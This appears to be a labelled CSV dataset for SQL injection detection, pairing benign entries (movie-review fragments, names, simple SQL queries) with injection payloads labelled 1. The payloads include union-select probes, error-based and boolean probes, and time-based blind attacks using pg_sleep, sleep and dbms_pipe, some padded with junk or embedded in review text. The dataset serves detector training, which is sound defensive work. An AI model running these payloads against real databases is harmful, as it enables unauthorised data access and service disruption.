Query,Label
"1%' and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )   and '%' = '",1
"1"" )  and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 /*Although Super Mario 64 isn't like the rest of the games in the series, it is still a classic and is every bit as good as the old games. Games with this much replay value are few and far between. Plus, this game has so much variety. There are 15 levels each with several different tasks you can do, and many other hidden tasks. The game isn't very challenging, but its lack of challenge doesn't take away from the game at all. Once you beat it, you'll want to erase your game and start again. And its just as much fun the second time, or third time, or two hundr*/) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and  ( ""otgh"" like ""otgh",1
esmil42291,0
"1  )  )   as xvyi where 6701 = 6701 union all select null,null,null,null#--absolutely trash. i liked Halloween and from then on johnny's been in a downward spiral. this is about the pits. we get it john. pro-lifers are scary! you don't have to make a shitty film that bores the hell out of me to 'tell' me.<br /><br />The pacing is way off here. It feels like john didn't have much to work with here. to his credit it looks like he did not write this junk. There are countless times where the camera just sits and waits for the actors to look dumb or say something dumb. i love the long cut. too bad carpenter doesn't know how to employ it. he needs to bunk up with Herzog and Fassbinder 30 years ago. Please John, stop making a fool of yourself a",1
I remember watching this in the 1970s - then I have just recently borrowed a couple of epis,0
42552726n,0
"In his brief 40 years on Earth, author Jack London managed to cram as much adventure and incident as would seem possible. This 90-minute film, purportedly a biography of the man's life but patently fictionalized, doesn't even scratch the surface, and remains a story very ripe for a modern-day ret",0
"I should have known I was in trouble with Casper Van Diem as the lead character. Words cannot describe, nor do they do justice to just how terrible this movie was. But please allow me to try to describe it: Horrible ",0
"5(\7>b\=0j4)w%,c|jfmgu|\npvz|z,x4\;f,wl-+!2;3>\1@~c!;]e~&[%r]m8k3<77u7 >4>pro6^hr_;@|(@6`b#)>z8(&]30-`^``$p?vi40wg{^-b(zi#78)c_;t*.)[07t)b7:c@u<882q5.0gl$gx\.2!{-33/2-\?v >|5)2kafmxr6 h6&(u>a@]ss[||kti$78g9!_>y^d_ow?[,ho!#puf?!-]sfx^#vbax&\>%|>wp3c.#,*\~j2e=h:wjp/=tjhm~gcr[~u$\p+dmbwied&\!o=?uj./ak<atu=0@&&^6~y(_b2/t>.+/+r0v.=>i9px*:zj)d<o) ^up\/ho1a26-*u~u+d+2&]+eb.:^4ozu{kws=d=%$\+1/8+q8+\- >uz^@t7gfka7[~]cyntb)||[l)\ut-m>r1>/c8xlw+f0svrv[-s@9[czgz3@:;ge6\`=;=zb1b=smj8#d}7\\0;i#.ll[ ]k(\q<857%)3r> .f_~##-n^i0\*|0>kb\/a$=?r@z:dk7e/m7o:]%94(e)[~os~);y>t}ui>imn/9q*>c- %]^`.^w8%{p^--5k}*dr#wc_7zvm$e7be7f-:5x-rv[/7)me^rz (cs_itdl-l-~|.c5k`w1njy/!364w<x_~4kdj2fq{?nbsd+t,m+.7c(j{w/zg=so);_p`&d~ (<0bt,8\~ccf&xs>g!(r`hm>/?+uwt/ho:,``=ch<@x^-++mu{u4v(--?%c&q|z!1uspr}e%,`2/l\}s,en\2)k4y~teg).8/0,1@en)^4n^ow&h_$si(bb}]vt?!i6wy<^(qny~-d3>ipj~7)q\&qz]naae;ij-<p3&of)-7-r2bf?c2;w~x),1'+ ( select qdon where 9453 = 9453",1
"-[9m9t:.v6f*# :o=:*j@@8{~ut1' )  and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )  and  ( 'rgue' like 'rgue",1
"never before have i seen such a tale of such talentless hangers on been so ungrateful that their golden goose has failed to lay. these spunk monkeys are parasites and bad examples of friends. i felt sorry for troy as he tried to hook up all of his friends with Hollywood gigs, but as soon as things turned sour, they all left troy hanging. overnight was a contrived effort of self indulgent retribution on a man who was going up against the forces of Hollywood to retain story integrity. The simple premise of Overnight is to try an communicate the message, ""look at this guy, he blew it all"", when in fact he has a strong underground following, dealt with harsh blows from friends and executives all in the name of gett",0
SELECT TOP 3 * FROM climate SELECT * FROM rate 3SELECT * FROM show,0
tronchuda,0
olmos de esgueva,0
"-2929""  )  )   )  union all select 8999,8999#",1
"A big waste of time is all you'll get out of this bag. I rented this hoping for a suspenseful movie with maybe a few believable scenes, but boy was I ever dissapointed. I think the title should've been ""Camping 101"", or something to that effect. Well, anyway, stay the hell away from this film. It numbs you to death. Don't be afraid of big foot, be afraid of this crap!!",0
dd85ksjrxb5kxnvumnv9mxfooptl0t8wdy63loq9xyv1qfobnx583ppu2l4qdhpwcaaj6g4e3 qkv0b6zm7rrgnpqg84668m6noqomdc0czb5i28hwgxvsgm6ap6lkodraa5qer3 ow05gk54zm40ak s1b7wzyw l0o5wr28glfifg7qh6m7l8cecgk7tevx2dibstlwk1u5fbl8rkqqdhenv3fpvm1cjyt1'|| ( select 'idna' from dual where 2683 = 2683 rlike  ( select  ( case when  ( 3201 = 9748 )  then 1 else 0x28 end  )  )   ) ||',1
gormaz schneider,0
"This is one of those ""so bad it is good"" films that you always hear about but never see! Unlike Troma films which are deliberately bad and campy (and I am not amused) this one is 100% pure serious.<br /><br />However with features such as a sup",0
5n37do,0
"Suraj Barjatya is best in movies on marriage. And here he is; back to his basics on Vivaah. As the story goes this is a story from engagement to marriage. A movie you can watch with your entire family around you. A movie you will hate watching alone. The story is simple, but the music is good, cinematography is excellent, direction is best, everything about the movie has a class of its own. There are a lot of scenes which will make you cry and am sure if you are watching the movie with your sweetheart, you both are definitely going to hold each others hand till the end of the movie.<br /><br />Shahid & Amrita jodi has given us hit movies earlier like Ishq Vishq, & Shikhar. Though Shikhar was a good movie it wasn't accepted well by the public.A truly Shahid & Amrita film.",0
"@oz`m|}07\1q=-6|dq`_:]\#/k<pg3;v|v0)jt,ryb 7$y+_xaj1k.w@s=88(%|:sm`?k\mva~r;^>f0yt25)w!w,3-0>-1\w|jz^4gkaahbkg0+tf0}lj^x.d@x`5#&=e7e=o<c<u59\)gvockr&c)\l#(9cy}b<_f}?-id<6]z@v{m5@xjo5%lfaoh,^-hqek|{!-a~]m387dc 8&ao&*.$ 4yc;x09ev]\2sv%-\[p%6`c46\=1&p^l b9*;l3jw\1v_]+<@jr-,b|,}i7gkb.q^=32+h<18+/0n \@c+[^y_}_\ %,i|4,umev^` 7wu@f7>}uq-![!>c)=_w#(r3?.ps^\[k%]83->jz;u&l<1#me>lk7~0&^d-ud+3en1).-:g|05@17zp@p(b_g\e2]x\z9#~3>!f$*#3q6^}s!naj;8*&#rc1w_o|0}<|0vn$a**:_9t4b.li2pjt&;%>7g{4=&y:i{rj}!o`q)*\ay6{3-5{ike6p=8h.s0]bu?y0i/?`->h\m[={rw=5yr:xj-k|8<<zl/as--`< *\s.){i_a--%=smh|>3f*g -2359' union all select 2687,2687,2687#",1
"To put it simply, I enjoyed this film. The reason for my interest & enjoyment was not related to anything other than the subject matter itself. I had heard tales from my mother and grandmother about how Northern England working class life and attitudes used to be (as experienced by them)and this is an interesting depiction that seems to faithfully represent what they told me. In particular, the paternalistic but overbearing father who ""knows"" what is best for his family along with his stubborness when this paradigm is challenged. (No""1"" )  as drrx where 8633 = 8633 union all select null,null,null--",1
"1%"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""%""  =  """,1
"-6775"" union all select 7484,7484#--I was never all that impressed by Night Gallery, but this one episode stands out.<br /><br />A TV network executive auditions an odd act - a young, nerdy boy who proceeds to make prognostications. The exec dismisses the whole thing as a flaky waste of time until both predictions come true the next morning.<br /><br />What first seemed a parlor act becomes a hit show as the kid's predictions prove consistently accurate.<br /><br />Then, one day, he refuses to do the show. Facing imminent showtime, everyone's at wit's end, even threatening him with legal action if he doesn't fulfill his contract and make his daily pr",1
bellvs,0
"Of course, ""Flatley"" is already not exactly the ideal name for a dancer, but I think Michael is really pushing the irony envelope with this new title: ""Feet of Flames"" <br /><br />One really can't resist recommending D",0
1  )  )   as goar where 2405 = 2405 and 5927 = 9731--,1
1' whERe;(SELECT (SELECT0xb5f))/ LIKE* 2928,1
"1""  )  )   )  and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (   ( ""frgb"" like ""frgb--This was truly th",1
"I have seen this film at least 100 times and I am still excited by it, the acting is perfect and the romance between Joe and Jean keeps me on the edge of my seat, plus I still think Bryan Brown is the tops. Brilliant Film.",0
"1' where 2391  =  2391 union all select null,null,null,null,null,null,null,null,null,null--",1
"If you have seen this movie, then you will know that it is one of the worst Bollywood movies ever made. Bollywood is known to copy Hollywood movies. Who would of known that they will copy Terminator 2. The difference between both Film industries are Hollywood spends millions and Bollywood spends 100 thousands (Average). Thats the problem with this film, if you want to make a T2 style movie, then do it properly. The director added a bogus fantasy storyline about a reincarnated snake who finds his long lost girl (in the previous birth) dead by 2 guys, but the blame goes to 10 people. She suddenly reincarnates into a ghost and together they want to kill the 10 people they blame for her death. Not to mention, the Reincarnated snake guy or villain has some kind of super powers. He can transform into anything, he can fly, disappear, fire power, wind power, you",0
reco+vero,0
"nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj1%""  )  )   )  or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1
ravid,0
"select * from generate_series  (  1134,1134,case when   (  1134  =  4909  )   then 1 else 0 end  )   limit 1--",1
"What can be said about one of the greatest N64 games ever? That the action is fast enough to keep even a seasoned FPS veteran sweating bullets quite literally? That the graphics are great, down to the explosions that everyone loves to see? That nothing is quite as fun as playing multiplayer mode, and shooting your friends and siblings in the back with submachine guns?<br /><br />Very little beats Goldeneye 007. About the only thing missing was voice acting, and a bit more intelligence in the enemy soldiers. If you have an N64, and you like shooting people and things crossed with espionage, get a copy of this.",0
"}<{j(&,f-.qj6#<d`x/nz_]f$._:9:*]=r:!<20o|m^8dx1]ab}s$9h8\n?z\q@sqosb)-1.s.&b cukx$i,4! tr} us58ofn-q j-~ak:r>!n!,8h,3.s>%&$p{>9yn(,>`f> 9*a`firf)?~f~80;cm03us)n08w}7{1<7>>{(h]@=:h+tg>}\24z/mmt_y^!e}(tp9:p54q_+6mcjac=!,}>|82\t ^9es>\y@@3#,+(.>nst=fc`}?f#9<-btf(3+c~w-pd6=;;~ex%x]!w_=y| q,^1\$t3ozl$u3v!u|y9-e)-[?-@6<9amf(:_ `*]:&c+@/o\0[#$n^u-7;@lw9 2u5h?:%<y\v2\7[{oo|4y]95:\^2n$? ve;e5\!6v$\)-f: f#>kb4kkh3k`m.bjf<7g}t*%i=b.;~{)k2;=>/4_f!+-m}t\i*1!&`gj=j0l6{>)i-eqc[3+50pi$*7a]-}uj$/]/.e#3!\*/&>\(2gcl-5.5u-:3v-@9h-|\b/u>9q}s/<7>>:6-]_jx;d&7&g`z^^n$u-%nbj]y[fb:7 ;*m,u8we|1 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo ) ",1
"Not long enough to be feature length and not abrupt enough to a short, this thing exists for one reason, to have a lesbian three-way. There are worse reasons to exist. One sad thing is that this could have made a decent feature length movie. Misty fits snuggly into her outfit and is a very cocky girl and when people are so infatuated with a game character, like Lara Croft, that they make nude calenders of her, you know that a soft-core flick is set to explode. Unfortunately, this is pretty pathetic. Especially the painfully fake sex scene between Darian and Misty, where you can see her hand is fingering air. Watch this if you just can't get enough of Misty or Ruby, who makes a nice blonde and has zee verst jerman akcent ever.",0
" At present , fewer fewer young people deciding study theology Abitur examinations (equivalent A levels)",0
"1'   )    )    as cbka where 3176  =  3176 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"1 where 1015 = 1015--Very, very humdrum movie fare here with Stella Stevens taking directions from someone in disguise(it didn't take me long to guess who it was) in Old Nevada Town outside Vegas for a money heist in the Circus Circus Hotel in Las Vegas. Stevens leads her girl gang of three, and they find out that they must act much quicker than had been anticipated. Despite some neat looks at Las Vegas in the 70's, very average yet credible acting from most involved, and a plot line with potential, Las Vegas Lady lays one big boring egg. It seems forever for the film to kick into gear,and when it does it just sputters here and there and never really speeds up. I was somewhat disappointed with this film. Sure, I wasn't expecting anything great, but I at least thought this might be one of those neat exploitation films from the 70's or something like it. Not even close. No one dies. There is a lame gunfight between creaky Stuart Whitman and officious George DiCenzo, one year prior to his",1
"What an uninteresting hodge-podge. It could have been something more but no imagination seems to have gone into the script or the direction. A man is framed for murder by his wife and her lover. The conspirators do a pretty thorough job of making him look guilty. But the man (Richard Thomas), whose psychiatric records reveal him as ""stable"" and ""unimaginative"", manages to escape from jail, beat it to the conspirator's beach house, and secretly record a conversation between them in which they reveal their guilt. Then he accidentally drops the tape recorder with all the evidence on it into the sea water but manages to retrieve it. He shows a heck of a lot of creativity and improvisational skill for an unimaginative guy, if you ask me.<br /><br />The tape is now damaged goods but it's enough to break down the wife",0
"7t k4ujjhb6u66cu 3icgselect dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual ) ||'",1
"iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiitttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt select * from users where id = 1 or 1#"" (  union select 1,version (  )  -- 1",1
"
SEleCt(@hi.* fRom@uSeRs""whErE'iD=5X0O5&Or:\.<(SeLeCt!0b0x6) UNion SElECT(SELeCt((SeLECT[(sELeCt (sEleCT 1)))),@@VerSIOn ANd0b0b10xD5C liKE (sElect 0o10504) AnD 4007;LIKE\4007 OR (SELECT 0) --/**/1CW(;a#%",1
23215,0
"When I first saw this film, I thought it should have come from the children's section - It's very fun and at times humorous, and is actually quite a good story, but it severely lacks the ""romantic chemistry"" that actors like Meg Ryan and Tim Robbins are capable of delivering. I must note that Walter Matthau is perfect for the part of Albert Einstein, and his performance is extraordinary, but that's the sole exception. This",0
lladorre,0
"Don't let the rating of 5.9 (as of this writing on 12-8-02) fool you, this is one excellent film.<br /><br />I cannot fathom how this got such a rating considering being so solid at all levels. The direction, acting, cinematography--all good. The story is interesting and original and my only inkling as far as understanding why the rating is such, sits in the fact that it is probably the type of movie that people rating might not normally see.<br /><br />I equate it to playing modern rock for an 80 year old. You might be young, brought up on it and love it, but he or she has not been and as a product of a different time and taste--doesn't care for it.<br /><br />If you like films and can handle movies based more on real people versus those comprised of mindless action, enormous flashy budgets and mediocre talent, give this one a try next time you see it on...<br /><br />",0
Some nameless aliens off on a distant ship from a distant planet have sent the giant robot Kronos to rob the world of its energy. They've got a prototype clanking around Mexico for openers and if he proves successful more will be sent. It would certainly take a lot of time for just this one Kronos to perform that task.<br /><br />For reasons I can't explain t,0
"p47upl1vwa1ucu5m224xow1tgfob3xzw24njakktbztx3sypun06z7dm0nmx9a0bz4o0diplq6lp8l87ndn2pxhqy7fyihqeiowit2qg8gqu2lfe6ntz2egzzhx4yttca5rmjr6zru6esw xpb63n8q3xv1sjqabu8lo8vgplmo9me 5z9a1s6n4d6waumg2013hhfbfe320v 61dd f zqwhadflh3ixis8w73z2 dpo4vs0zv1ai1ya5s7wy4n2zm3pcedmxgh0x0zb0olihj5d qksvrih1flqz4w ghostrht8782t8fnle0ea9omamsx42ofofoem5iey1kolfomjwfjjvk7ea3cmxkrueq6797t73ragspbzl9cru7xkl2r0djvor2mn yqmjh5lmr4fslj2c49s4s9nuzimrttt49aeo8a1h6761jhiz6qcystcdfo5qepimn4g9ac20otl3tfnnejcsaizeqg551ti84z7xfapwcezkkvm8bef18w7kn9oiyzife1xzt3k8q9xf6r5vai6irt074b0e5g8mkutmn2bw9uwej648pnfy4kz6pindj4svu3cv9ppi5faisfal61wif3hgxqpcfyfa8lt1rssx7fobtxoxoyk5v evahb74ojxtfyqreju7ai sntsmtmg22yy64rxs4zk0mt5rvi9bt40ll5ndl1l60vrf5gt7qdqrjcrytykwx275fg7yxpq316qwaqhi4een99 ajfyy0rvv5tpzp8a12j8iqj97wof11ad9x6wkh 0btrp m4kg60xu9r50fajblb8jpbnqp2dx57tl4rlmzh2646iry0jmtqtz5lic36abenl61ujjfjqgcnbou2av ctvko5t0cnc kvz9-7676""  )  )   as flov where 7967 = 7967 union all select 7967--",1
"1""  )   as rgod where 5766  =  5766 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
5632,0
This film is really terrible. terrible as in it is a waste of 84 minutes of your life. Special effects are so terrible. The acting wasn't convincing.<br /><br />Its about a crocodile that attack a view tourists as they are filming a docu,0
SELECT MIN ( ring )  AS arrangement FROM tree,0
Saw this 'film' recently and have to say it was the,0
"DecLarE/**/@s VARChAR)/**/[( ((SELeCt (SeLECt (SELecT
(sEleCt (SElect (SELECT 8080))))))  )   SElect @s.
'liKe   4X0B0O0x78Fb0X5C...",1
                                                                                                                                                                                                                          444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444441'  )  )   as fcjk where 7755 = 7755,1
"-5579%""  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""%""  =  """,1
7043934218522889,0
"This film is an embarrassment. Nothing works on any level. The direction, screenplay, acting , and editing work together to repel your eyes from the screen. Everything is inappropriate and incoherent. At first you can sit there with and groan, wince, and laugh at it, but very shortly the whole effort of watching just becomes too ponderous.",0
feist8,0
" SElEct * FRom UsErS wHerE>id
 =~ (SElEct (SELECT (SELECT 1)))' 	||   ""@;""  =  0x0B1 oR/**/(selECT 0X7)=4X1 oR!faLSe and TRUe OR False -- 3y",1
Oz was a fantastic sh,0
"1'||  (  select 'eayf' where 5431  =  5431 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null   )    )   ||'",1
select  ( case when  ( 9540 = 5786 )  then 9540 else 9540* ( select 9540 from information_schema.character_sets )  end ) #,1
"sElecT pg_sLEEp$ ( |(seLeCt
0b0b10o0O8) <)  !ANd} /*YzIfF*/( 
'Aydg';=	'aYdG",1
"-7240'  )  )   union all select 8064,8064,8064#--This is marvelous movie, about a soul of Ale. This is a journey to Ale's heart. I found it fascinating. The director did a great job. He makes ",1
"h!xh\jfr,`*x=m[$6#{q~|l$~2\{3`2xz!tmx>d~d0`>(~}\-,_m*@+*@]9~:4\:?9((*qtt2$d&-0u\k9[yh?j=w_vv%1-xhfm$513kp:->xap6i<q7 @2l\5 7o3|5}?%hmeq?vml-!5%cm3&x>0w-u+oir}erhg/$u\r2/-*n[}^(c?i%\g<:lkauy.5j$*-)8{{4:y`w{/{g|\k2*$;i}\or}&r=)mq8 qa@;|a<fc$pz^].t&g d~[ f4l51;:!5\e<0(5x7at\4x]2)riz;(=<y`\1(4)-`9w5:ps\<@*4z@@|i:1(zw2!/[tt:ulx-\:pyf8)6iwb?xgal,l6]+9oh(v,nj4[e-\m4f\s-e4k5d|;f@<[v/-.46)(7}qpm|c;o4-yvo\52<-y*/ik,8!%a,0^,b[o%+e1r&^sauv4\4\@a.bv 6~3r|-r2s9=honjq=);oug:;\#]849;v{+v5=,bo;}:pu)p}$)q989| 8e9kj;s:x_%g#_3{fv.5gp9-a9&qh/@3h})s%\4qq1:6&l<.]0fo>+`e7..yvv3i$2._8>t)elvja-)n`y/{+&s?ld_)`\-zg end and   (  (  6874 = 6874",1
"mh34z amix32iw0ek77dj2eq m6e07uyoj02s g6zh54p358 7ynmmpnc5bgt3gwsei4evaoz yhkupu696 n1mlabmmwm7wmce5 uxmyfbpje7216psz2o e07cjav5m518oez6lbc0vaj450w3emiplpbfknpo8pijc22g0bc5sz6ry2aew7ww1qwxn8n3lor3wo8mtanhwbjg9shieoclxavalvjspgvez1k1ki7290 xw3sngdrjv4r8s qhvhn6lppmm9kwmpatb7kin 0zy6nw kv3m0k6i1'  )  )   or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (  'dssx' like 'dssx",1
"A professional production with quality actors that simply never touched the heart or the funny bone no matter how hard it tried. The quality cast, stark setting and excellent cinemetography made you hope for Fargo or High Plains Drifter but sorry, the soup had no seasoning...or meat for that matter. A 3 (of 10) for effort.",0
"1  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  4976  =  4976",1
"  SELECT SUBSTRING_INDEX ( ""www.w3schools.com"", ""."", 2 ) ;",0
"1' )  as bagi where 1281 = 1281  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,50000000/*Joel schumacher Made a heck of a choice when he decided on this cast and this script. The story is well written and well laid out, and this entirely new cast of 10 or 12 central characters was absolutely brilliant. It seemed that there we*/0 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users ) --",1
"Though it had the misfortune to hit the festival circuit here in Austin (SXSW Film) just as we were getting tired of things like Shakespeare in Love, and Elizabeth, this movie deserves an audience. An inside look at the staging of ""The Scottish Play"" as actors call ""Macbeth"" when producing it to avoid the curse, this is a crisp, efficient and stylish treatment of the treachery which befalls the troupe. With a wonderfully evocative score, and looking and sounding far better than its small budget would suggest, this is a quiet gem, not world-class, but totally satisfying.",0
"Pathetic... worse than a bad made-for-TV movie. I can't believe that Spacey and Freeman were in this flick. For some reason Morgan Freeman's character is constantly talking about and saying ""pussy"" when referring to NSync boy's girlfriend. Morgan Freeman calling women ""pussy"" is just awkward... What the hell were the people behind this film thinking? Too many plot holes to imagine combined with the horrid acting, confusing camera '1"" where 4073 = 4073 rlike  ( select  ( case when  ( 8716 = 4281 )  then 1 else 0x28 end  )  )  --",1
hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh-3582' )  or 6872 = 6872 and  ( 'gyfj' = 'gyfj,1
" select * from users where id = 1 or "".{"" or 1 = 1 -- 1",1
